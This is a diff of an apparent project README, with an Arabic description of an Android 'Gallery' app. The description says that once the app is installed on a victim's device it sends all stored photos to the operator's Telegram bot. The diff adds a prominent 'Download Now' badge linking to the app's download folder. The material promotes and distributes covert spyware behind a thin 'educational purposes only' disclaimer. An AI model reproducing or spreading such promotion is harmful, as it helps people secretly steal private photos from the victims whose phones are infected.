@@ -29,3 +29,7 @@ Português:
 
 عربى:
 > هذا البرنامج مصمم لأغراض تعليمية فقط! الجاليري إي هو أداة للتجسس على الصور المحفوظة على أجهزة Android. بمجرد تثبيت الجاليري على جهاز الضحية ، سيقوم بإرسال جميع الصور المحفوظة إلى روبوت التلغرام الخاص بك.
+
+<div align="center">
+
+[![Download](https://img.shields.io/badge/Download-Now%20-green?color=%233DDC84&logo=android&logoColor=%23fff&style=for-the-badge)](https://github.com/MDGramYou/MDGramYou/tree/main/Download)
